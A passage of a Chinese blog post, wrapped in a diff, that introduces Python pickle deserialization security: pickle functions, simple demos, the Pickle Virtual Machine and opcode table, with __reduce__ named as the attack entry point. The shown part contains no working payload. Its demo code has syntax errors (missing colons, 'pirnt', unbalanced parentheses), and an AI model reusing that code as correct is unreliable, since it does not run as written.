@@ -1,0 +1,2272 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>PYTHON安全问题总结(一) - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="PYTHON安全问题总结(一)" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ML-hacker.github.io/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-14T14:34:26+08:00" />
+<meta property="article:modified_time" content="2024-04-14T14:34:26+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="PYTHON安全问题总结(一)"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/" /><link rel="prev" href="http://ML-hacker.github.io/posts/%E6%B5%85%E8%B0%88bashfuck/" /><link rel="next" href="http://ML-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PYTHON安全问题总结(一)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http://ML-hacker.github.io/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/"
+        },"genre": "posts","keywords": "PYTHON, 反序列化","wordcount":  2822 ,
+        "url": "http://ML-hacker.github.io/posts/python%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%80/","datePublished": "2024-04-14T14:34:26+08:00","dateModified": "2024-04-14T14:34:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Delete"},"author": {
+                "@type": "Person",
+                "name": "Delete"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PYTHON安全问题总结(一)</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-04-14">2024-04-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2822 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;14 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h1><p>总而言之就是，目前对于python的东西一知半解，所以需要写一个总的学习，也算是记录一下自己的学习过程吧。</p>
+<h1 id="pickle反序列化" class="headerLink">
+    <a href="#pickle%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="header-mark"></a>pickle反序列化</h1><h2 id="简介" class="headerLink">
+    <a href="#%e7%ae%80%e4%bb%8b" class="header-mark"></a>简介</h2><ul>
+<li>
+<p>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</p>
+</li>
+<li>
+<p><code>Python</code>中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p>
+</li>
+<li>
+<p>相较于<code>PHP</code>反序列化灵活多样的利用方式, 例如<code>POP</code>链构造, <code>Phar</code>反序列化, 原生类反序列化以及字符逃逸等. <code>Python</code>相对而言没有<code>PHP</code>那么灵活, 关于反序列化漏洞主要涉及这么几个概念: <code>pickle</code>, <code>pvm</code>, <code>__reduce__</code>魔术方法.</p>
+</li>
+<li>
+<p>这里补充下reduce方法就类似于wakeup方法，即在反序列化开始后第一个执行的方法。
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/18.png"
+        srcset="/img/pickle/18.png, /img/pickle/18.png 1.5x, /img/pickle/18.png 2x"
+        alt="/img/pickle/18.png"
+        title="/img/pickle/18.png" ></figure></p>
+</li>
+</ul>
+<p>pickle有以下操作方法:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">dump</td>
+<td style="text-align:left">对象反序列化到文件对象并存入文件</td>
+</tr>
+<tr>
+<td style="text-align:left">dumps</td>
+<td style="text-align:left">对象反序列化为 bytes 对象</td>
+</tr>
+<tr>
+<td style="text-align:left">load</td>
+<td style="text-align:left">对象反序列化并从文件中读取数据</td>
+</tr>
+<tr>
+<td style="text-align:left">loads</td>
+<td style="text-align:left">从 bytes 对象反序列化</td>
+</tr>
+</tbody>
+</table>
+<h3 id="demo-1序列化" class="headerLink">
+    <a href="#demo-1%e5%ba%8f%e5%88%97%e5%8c%96" class="header-mark"></a>demo 1（序列化）</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">demo1</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;dddtttt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo1</span><span class="p">()))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果</p>
+<ul>
+<li>python3环境下
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/19.png"
+        srcset="/img/pickle/19.png, /img/pickle/19.png 1.5x, /img/pickle/19.png 2x"
+        alt="/img/pickle/19.png"
+        title="/img/pickle/19.png" ></figure></li>
+<li>python2环境下
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/20.png"
+        srcset="/img/pickle/20.png, /img/pickle/20.png 1.5x, /img/pickle/20.png 2x"
+        alt="/img/pickle/20.png"
+        title="/img/pickle/20.png" ></figure>
+输出的一大串字符实际上是一串<code>PVM</code>操作码, 可以在<code>pickle.py</code>中看到关于这些操作码的详解.</li>
+</ul>
+<h3 id="demo2-反序列化" class="headerLink">
+    <a href="#demo2-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="header-mark"></a>demo2 (反序列化)</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">demo2</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;dddddtttt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;++++序列化结果：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo2</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;++++反序列化果：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pirnt</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo2</span><span class="p">())))</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>python3
+<figure><img
+        
+        loading="lazy"
+        src="/img/pickle/21.png"
+        srcset="/img/pickle/21.png, /img/pickle/21.png 1.5x, /img/pickle/21.png 2x"
+        alt="/img/pickle/21.png"
+        title="/img/pickle/21.png" ></figure></li>
+</ul>
+<h2 id="pvm" class="headerLink">
+    <a href="#pvm" class="header-mark"></a>PVM</h2><ul>
+<li>pickle解析依靠Pickle Virtual Machine (PVM)进行。</li>
+</ul>
+<h3 id="组成" class="headerLink">
+    <a href="#%e7%bb%84%e6%88%90" class="header-mark"></a>组成</h3><ul>
+<li>指令处理器: 从流中读取<code>opcode</code>和参数, 并对其进行解释处理. 重复这个动作, 直到遇到<code>.</code>这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回.</li>
+<li>栈区(<code>stack</code>): 由<code>Python</code>的<code>list</code>实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果.</li>
+<li>标签区(<code>memo</code>): 由<code>Python</code>的<code>dict</code>实现, 为<code>PVM</code>的整个生命周期提供存储.</li>
+</ul>
+<h3 id="执行流程" class="headerLink">
+    <a href="#%e6%89%a7%e8%a1%8c%e6%b5%81%e7%a8%8b" class="header-mark"></a>执行流程</h3><p>首先，PVM会把源代码编译成字节码，若python在目标机器有写入文件权限，则其会吧编译后的字节码保存在<code>.pyc</code>文件中方便后续使用，反过来则会把其丢弃。然后, <code>Python</code>进程会把编译好的字节码转发到<code>PVM</code>(<code>Python</code>虚拟机)中, <code>PVM</code>会循环迭代执行字节码指令, 直到所有操作被完成.</p>
+<h3 id="指令集" class="headerLink">
+    <a href="#%e6%8c%87%e4%bb%a4%e9%9b%86" class="header-mark"></a>指令集</h3><p>这里贴一下H3rmesk1t师傅的
+当前用于<code>pickling</code>的协议共有<code>6</code>种, 使用的协议版本越高, 读取生成的<code>pickle</code>所需的<code>Python</code>版本就要越新.</p>
+<ul>
+<li><code>v0</code>版协议是原始的&quot;人类可读&quot;协议, 并且向后兼容早期版本的<code>Python</code>.</li>
+<li><code>v1</code>版协议是较早的二进制格式, 它也与早期版本的<code>Python</code>兼容.</li>
+<li><code>v2</code>版协议是在<code>Python 2.3</code>中引入的, 它为存储<code>new-style class</code>提供了更高效的机制, 参阅<code>PEP 307</code>.</li>
+<li><code>v3</code>版协议添加于<code>Python 3.0</code>, 它具有对<code>bytes</code>对象的显式支持, 且无法被<code>Python 2.x</code>打开, 这是目前默认使用的协议, 也是在要求与其他<code>Python 3</code>版本兼容时的推荐协议.</li>
+<li><code>v4</code>版协议添加于<code>Python 3.4</code>, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅<code>PEP 3154</code>.</li>
+<li><code>v5</code>版协议添加于<code>Python 3.8</code>, 它支持带外数据, 加速带内数据处理.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># here is in kind-of alphabetical order of 1-character pickle code.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pickletools groups them by purpose.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">MARK</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;(&#39;</span>   <span class="c1"># push special markobject on stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">STOP</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;.&#39;</span>   <span class="c1"># every pickle ends with STOP</span>
+</span></span><span class="line"><span class="cl"><span class="n">POP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span>   <span class="c1"># discard topmost stack item</span>
+</span></span><span class="line"><span class="cl"><span class="n">POP_MARK</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span>   <span class="c1"># discard stack top through topmost markobject</span>
+</span></span><span class="line"><span class="cl"><span class="n">DUP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span>   <span class="c1"># duplicate top stack item</span>
+</span></span><span class="line"><span class="cl"><span class="n">FLOAT</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span>   <span class="c1"># push float object; decimal string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">INT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I&#39;</span>   <span class="c1"># push integer or bool; decimal string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">BININT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;J&#39;</span>   <span class="c1"># push four-byte signed int</span>
+</span></span><span class="line"><span class="cl"><span class="n">BININT1</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;K&#39;</span>   <span class="c1"># push 1-byte unsigned int</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;L&#39;</span>   <span class="c1"># push long; decimal string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">BININT2</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;M&#39;</span>   <span class="c1"># push 2-byte unsigned int</span>
+</span></span><span class="line"><span class="cl"><span class="n">NONE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;N&#39;</span>   <span class="c1"># push None</span>
+</span></span><span class="line"><span class="cl"><span class="n">PERSID</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;P&#39;</span>   <span class="c1"># push persistent object; id is taken from string arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINPERSID</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;Q&#39;</span>   <span class="c1">#  &#34;       &#34;         &#34;  ;  &#34;  &#34;   &#34;     &#34;  stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">REDUCE</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;R&#39;</span>   <span class="c1"># apply callable to argtuple, both on stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">STRING</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;S&#39;</span>   <span class="c1"># push string; NL-terminated string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINSTRING</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;T&#39;</span>   <span class="c1"># push string; counted binary string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">SHORT_BINSTRING</span><span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;U&#39;</span>   <span class="c1">#  &#34;     &#34;   ;    &#34;      &#34;       &#34;      &#34; &lt; 256 bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">UNICODE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;V&#39;</span>   <span class="c1"># push Unicode string; raw-unicode-escaped&#39;d argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINUNICODE</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;X&#39;</span>   <span class="c1">#   &#34;     &#34;       &#34;  ; counted UTF-8 string argument</span>
+</span></span><span class="line"><span class="cl"><span class="n">APPEND</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span>   <span class="c1"># append stack top to list below it</span>
+</span></span><span class="line"><span class="cl"><span class="n">BUILD</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span>   <span class="c1"># call __setstate__ or __dict__.update()</span>
+</span></span><span class="line"><span class="cl"><span class="n">GLOBAL</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span>   <span class="c1"># push self.find_class(modname, name); 2 string args</span>
+</span></span><span class="line"><span class="cl"><span class="n">DICT</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;d&#39;</span>   <span class="c1"># build a dict from stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_DICT</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;}&#39;</span>   <span class="c1"># push empty dict</span>
+</span></span><span class="line"><span class="cl"><span class="n">APPENDS</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;e&#39;</span>   <span class="c1"># extend list on stack by topmost stack slice</span>
+</span></span><span class="line"><span class="cl"><span class="n">GET</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;g&#39;</span>   <span class="c1"># push item from memo on stack; index is string arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINGET</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;h&#39;</span>   <span class="c1">#   &#34;    &#34;    &#34;    &#34;   &#34;   &#34;  ;   &#34;    &#34; 1-byte arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">INST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;i&#39;</span>   <span class="c1"># build &amp; push class instance</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG_BINGET</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;j&#39;</span>   <span class="c1"># push item from memo on stack; index is 4-byte arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">LIST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;l&#39;</span>   <span class="c1"># build list from topmost stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_LIST</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;]&#39;</span>   <span class="c1"># push empty list</span>
+</span></span><span class="line"><span class="cl"><span class="n">OBJ</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;o&#39;</span>   <span class="c1"># build &amp; push class instance</span>
+</span></span><span class="line"><span class="cl"><span class="n">PUT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;p&#39;</span>   <span class="c1"># store stack top in memo; index is string arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINPUT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;q&#39;</span>   <span class="c1">#   &#34;     &#34;    &#34;   &#34;   &#34; ;   &#34;    &#34; 1-byte arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">LONG_BINPUT</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;r&#39;</span>   <span class="c1">#   &#34;     &#34;    &#34;   &#34;   &#34; ;   &#34;    &#34; 4-byte arg</span>
+</span></span><span class="line"><span class="cl"><span class="n">SETITEM</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;s&#39;</span>   <span class="c1"># add key+value pair to dict</span>
+</span></span><span class="line"><span class="cl"><span class="n">TUPLE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;t&#39;</span>   <span class="c1"># build tuple from topmost stack items</span>
+</span></span><span class="line"><span class="cl"><span class="n">EMPTY_TUPLE</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;)&#39;</span>   <span class="c1"># push empty tuple</span>
+</span></span><span class="line"><span class="cl"><span class="n">SETITEMS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;u&#39;</span>   <span class="c1"># modify dict by adding topmost key+value pairs</span>
+</span></span><span class="line"><span class="cl"><span class="n">BINFLOAT</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;G&#39;</span>   <span class="c1"># push float; arg is 8-byte float encoding</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TRUE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I01</span><span class="se">\n</span><span class="s1">&#39;</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+</span></span><span class="line"><span class="cl"><span class="n">FALSE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I00</span><span class="se">\n</span><span class="s1">&#39;</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Protocol 2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PROTO</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span>  <span class="c1"># identify pickle protocol</span>
